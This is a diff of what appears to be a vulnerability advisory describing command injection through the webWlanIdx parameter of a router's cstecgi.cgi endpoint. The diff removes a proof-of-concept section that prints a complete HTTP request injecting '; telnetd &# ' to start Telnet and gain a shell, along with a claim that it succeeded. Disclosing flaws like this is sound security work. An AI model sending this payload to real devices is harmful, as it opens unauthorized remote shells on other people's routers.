@@ -24,33 +24,3 @@ If an attacker can inject malicious commands into v5 (the user input parameter) 
 An attacker can exploit this command execution vulnerability by sending specially crafted API requests that inject malicious commands into the webWlanIdx parameter, potentially leading to complete control over the system.
 
 
-
-# POC
-
-```
-POST /cgi-bin/cstecgi.cgi HTTP/1.1
-Host: 192.168.0.1
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 65
-Origin: http://192.168.0.1
-Connection: close
-Referer: http://192.168.0.1/adm/notice.asp
-Cookie: SESSION_ID=2:1743960903:2
-Priority: u=0
-
-{"topicurl":"setting/setWebWlanIdx","webWlanIdx":"; telnetd &# "}
-```
-
-### Attack Result
-
-![Snipaste_2025-04-07_01-42-01](figures/Snipaste_2025-04-07_01-42-01.png)
-
-![Snipaste_2025-04-06_02-45-09](figures/Snipaste_2025-04-06_02-45-09.png)
-
-As shown in the above image, command injection was successful, and the target router supports Telnet service, allowing access to the device's shell via Telnet.
-
